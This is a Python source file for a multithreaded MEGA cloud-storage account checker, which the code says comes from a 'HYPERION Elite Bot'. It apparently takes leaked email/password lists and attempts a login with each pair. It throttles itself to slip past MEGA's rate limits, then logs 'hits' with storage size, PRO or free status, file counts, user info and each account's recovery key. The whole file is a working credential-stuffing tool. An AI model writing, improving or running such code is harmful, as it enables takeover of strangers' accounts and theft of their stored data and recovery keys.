"""
MEGA Account Authenticator - Ultra Performance
Integrated from HYPERION Elite Bot for credential validation
"""

import logging
import time
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import List, Dict, Optional, Callable, Tuple
from datetime import datetime

logger = logging.getLogger(__name__)

# MEGA import with error handling
try:
    from mega import Mega
    MEGA_AVAILABLE = True
except ImportError:
    MEGA_AVAILABLE = False
    logger.warning("mega.py not available - install with: pip install mega.py")


@dataclass
class AccountResult:
    """Account check result"""
    email: str
    password: str
    status: str  # 'hit', 'fail', 'error'
    account_type: str = "Unknown"
    total_gb: float = 0.0
    used_gb: float = 0.0
    free_gb: float = 0.0
    file_count: int = 0
    folder_count: int = 0
    user_info: Dict = None
    recovery_key: str = "N/A"
    error: str = ""
    position: int = 0
    timestamp: str = ""
    response_time: float = 0.0


class MegaAuthenticator:
    """
    Ultra-high performance MEGA account validator
    Based on HYPERION Elite Bot v7.0
    """
    
    def __init__(self, max_threads: int = 100):
        if not MEGA_AVAILABLE:
            raise ImportError("mega.py library required! Install: pip install mega.py")
        
        self.max_threads = max_threads
        self.lock = threading.Lock()
        self.stats = {
            'total': 0,
            'checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': 0,
            'current_cpm': 0
        }
        
        logger.info(f"✅ MegaAuthenticator initialized with {max_threads} threads")
    
    def check_accounts(self, accounts: List[Dict], progress_callback: Optional[Callable] = None) -> List[AccountResult]:
        """
        Check multiple MEGA accounts in parallel
        
        Args:
            accounts: List of {'email': str, 'password': str}
            progress_callback: Optional callback(checked, total, stats)
            
        Returns:
            List of AccountResult objects
        """
        # Reduce threads to avoid MEGA rate limits (max 10 concurrent)
        actual_threads = min(self.max_threads, 10)
        logger.info(f"🔥 Starting MEGA validation: {len(accounts)} accounts with {actual_threads} threads (rate limited)")
        
        self.stats = {
            'total': len(accounts),
            'checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': time.time(),
            'current_cpm': 0,
            'stop_requested': False
        }
        
        results = []
        
        # Use ThreadPoolExecutor with reduced concurrency to avoid rate limits
        with ThreadPoolExecutor(max_workers=actual_threads) as executor:
            futures = {}
            
            for idx, account in enumerate(accounts):
                if self.stats['stop_requested']:
                    break
                
                future = executor.submit(self._check_single_account, account, idx + 1)
                futures[future] = idx
            
            # Process results as they complete
            for future in as_completed(futures):
                if self.stats['stop_requested']:
                    break
                
                try:
                    result = future.result(timeout=30)
                    if result:
                        results.append(result)
                        
                        with self.lock:
                            if result.status == 'hit':
                                self.stats['hits'] += 1
                                logger.info(f"🎯 HIT: {result.email} - {result.account_type}")
                            elif result.status == 'fail':
                                self.stats['fails'] += 1
                            else:
                                self.stats['errors'] += 1
                            
                            self.stats['checked'] += 1
                            
                            # Calculate CPM
                            elapsed = time.time() - self.stats['start_time']
                            if elapsed > 0:
                                self.stats['current_cpm'] = int((self.stats['checked'] / elapsed) * 60)
                            
                            # Progress callback
                            if progress_callback and self.stats['checked'] % 10 == 0:
                                progress_callback(self.stats['checked'], self.stats['total'], self.stats.copy())
                
                except Exception as e:
                    logger.error(f"Error processing future: {e}")
                    self.stats['errors'] += 1
        
        logger.info(f"✅ Check complete: {self.stats['checked']} checked, {self.stats['hits']} hits, {self.stats['fails']} fails")
        return results
    
    def _check_single_account(self, account: Dict, position: int) -> Optional[AccountResult]:
        """Check a single MEGA account"""
        start_time = time.time()
        
        # Add delay to avoid rate limiting (0.5 sec between each check)
        time.sleep(0.5)
        
        try:
            email = account.get('email', '').strip()
            password = account.get('password', '').strip()
            
            if not email or not password:
                return AccountResult(
                    email=email,
                    password=password,
                    status='error',
                    error='Invalid credentials format',
                    position=position,
                    timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                )
            
            # Create MEGA instance and attempt login
            mega = Mega()
            
            try:
                logger.debug(f"Attempting login for {email}")
                account_session = mega.login(email, password)
                
                # Login succeeded - get account details
                response_time = time.time() - start_time
                
                try:
                    # Get user info
                    user_info = account_session.get_user()
                    
                    # Get storage info
                    storage_info = account_session.get_storage_space()
                    total_storage = storage_info.get('total', 0)
                    used_storage = storage_info.get('used', 0)
                    
                    # Convert to GB
                    total_gb = total_storage / (1024 ** 3) if total_storage else 0
                    used_gb = used_storage / (1024 ** 3) if used_storage else 0
                    free_gb = total_gb - used_gb
                    
                    # Determine account type
                    if total_gb > 50:  # Pro accounts typically 400GB+
                        account_type = "PRO"
                    elif used_gb > 0:
                        account_type = "FREE_USED"
                    else:
                        account_type = "FREE_EMPTY"
                    
                    # Try to get recovery key
                    recovery_key = "N/A"
                    try:
                        recovery_key = account_session.get_recovery_key() or "N/A"
                    except:
                        pass
                    
                    # Try to get file/folder counts
                    file_count = 0
                    folder_count = 0
                    try:
                        files = account_session.get_files()
                        if isinstance(files, dict):
                            for item in files.values():
                                if isinstance(item, dict):
                                    if item.get('t') == 1:  # Folder
                                        folder_count += 1
                                    else:  # File
                                        file_count += 1
                    except:
                        pass
                    
                    return AccountResult(
                        email=email,
                        password=password,
                        status='hit',
                        account_type=account_type,
                        total_gb=round(total_gb, 2),
                        used_gb=round(used_gb, 2),
                        free_gb=round(free_gb, 2),
                        file_count=file_count,
                        folder_count=folder_count,
                        user_info=user_info,
                        recovery_key=recovery_key,
                        position=position,
                        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        response_time=response_time
                    )
                
                except Exception as details_error:
                    logger.warning(f"Could not get full details for {email}: {details_error}")
                    # Still a hit, just without full details
                    return AccountResult(
                        email=email,
                        password=password,
                        status='hit',
                        account_type='UNKNOWN',
                        position=position,
                        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        response_time=time.time() - start_time
                    )
            
            except Exception as login_error:
                # Login failed
                error_str = str(login_error).lower()
                
                # Check if it's a rate limit - sleep longer
                if 'temporarily' in error_str or 'rate' in error_str or 'banned' in error_str or 'too many' in error_str:
                    logger.warning(f"⏸️  MEGA rate limit detected - waiting 5 seconds")
                    time.sleep(5)
                    return AccountResult(
                        email=email,
                        password=password,
                        status='error',
                        error='Rate limited by MEGA',
                        position=position,
                        timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        response_time=time.time() - start_time
                    )
                
                logger.debug(f"❌ FAIL: {email} - {error_str}")
                
                return AccountResult(
                    email=email,
                    password=password,
                    status='fail',
                    error=str(login_error),
                    position=position,
                    timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    response_time=time.time() - start_time
                )
        
        except Exception as e:
            logger.error(f"Critical error checking {email}: {e}")
            return AccountResult(
                email=email,
                password=password,
                status='error',
                error=str(e),
                position=position,
                timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                response_time=time.time() - start_time
            )
    
    def stop(self):
        """Request to stop checking"""
        self.stats['stop_requested'] = True
        logger.info("Stop requested for MEGA authenticator")
    
    def get_stats(self) -> Dict:
        """Get current statistics"""
        with self.lock:
            return self.stats.copy()
